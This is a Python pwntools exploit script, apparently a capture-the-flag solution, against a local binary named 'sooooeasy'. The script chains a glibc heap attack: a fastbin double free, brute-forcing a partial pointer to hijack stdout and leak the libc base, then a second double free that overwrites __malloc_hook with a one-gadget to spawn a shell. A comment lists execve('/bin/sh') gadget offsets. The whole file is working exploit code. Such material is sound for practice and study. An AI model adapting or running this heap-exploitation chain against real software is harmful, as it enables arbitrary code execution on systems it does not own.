#encoding:utf-8
from pwn import *
context.log_level='debug'

def command(id):
	p.recvuntil("choice : ")
	p.sendline(str(id))
def add(size,name,message):
	command(1)
	p.recvuntil("name: \n")
	p.sendline(str(size))
	p.recvuntil("name:\n")
	p.send(name)
	p.recvuntil("message:\n")
	p.sendline(message)
def delete(id):
	command(2)
	p.recvuntil("index:\n")
	p.sendline(str(id))

def pwn():
	add(0x68,'a'*8,'a'*8)	#0
	add(0x68,'b'*8,'b'*8)
	add(0xf8,'c'*8,'c'*8)	#2
	add(0x68,'d'*8,'d'*8)	#3

	# unsortedbin 写入 main_arena 指针
	delete(2)

	add(0x28,'\x00','f'*8)

	# 写入爆破地址，这里爆破的是stdout上面的_IO_wide_data_2，利用偏移构造出fastbin size位
	_IO_2_1_stdout_s = libc.symbols['_IO_2_1_stdout_']
	add(0x68,p16((2 << 12) + ((_IO_2_1_stdout_s-0x43) & 0xFFF)),'g'*8)
	# add(0x60,p16(0x25dd),'g'*8)

	# fastbin double free
	delete(0)
	delete(3)
	delete(0)

	add(0x68,p8(0),'1'*8)
	add(0x68,p8(0),'2'*8)
	add(0x68,p8(0),'3'*8)
	add(0x68,p8(0),'4'*8)

	# hijack stdout
	payload = '\x00'*0x33 + p64(0x0FBAD1887) +p64(0)*3 + p8(0x88)
	command(1)
	p.recvuntil("name: \n")
	p.sendline(str(0x60))
	p.recvuntil("name:\n")
	p.send(payload)

	_IO_2_1_stdin_ = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	log.info("_IO_2_1_stdin_:"+hex(_IO_2_1_stdin_))

	p.recvuntil("message:\n")
	p.sendline('5'*8)

	libc_base = _IO_2_1_stdin_ - libc.symbols['_IO_2_1_stdin_']
	log.info("libc_base:"+hex(libc_base))
	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	log.info("malloc_hook:"+hex(malloc_hook))
	realloc_hook = libc_base + libc.symbols['__realloc_hook']
	log.info("realloc_hook:"+hex(realloc_hook))
	realloc = libc_base + libc.symbols['realloc']
	log.info("realloc:"+hex(realloc))
	onegadget = libc_base + 0x4527a
	log.info("onegadget:"+hex(onegadget))
	'''
	0x45226 execve("/bin/sh", rsp+0x30, environ)
	constraints:
	  rax == NULL

	0x4527a execve("/bin/sh", rsp+0x30, environ)
	constraints:
	  [rsp+0x30] == NULL

	0xf0364 execve("/bin/sh", rsp+0x50, environ)
	constraints:
	  [rsp+0x50] == NULL

	0xf1207 execve("/bin/sh", rsp+0x70, environ)
	constraints:
	  [rsp+0x70] == NULL
	'''
	# fastbin double free
	delete(6)
	delete(7)
	delete(6)
	add(0x68,p64(malloc_hook-0x23),'\x00')
	add(0x68,'z','z')
	add(0x68,'x','x')

	payload = 'a'*0xb+p64(onegadget)+p64(realloc+13)
	add(0x68,payload,'y')
	
	command(1)

	p.interactive()

if __name__ == '__main__':
	p = process("./sooooeasy")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	while True:
		try:
			pwn()
			exit(0)
		except:
			p.close()
			p = process("./sooooeasy")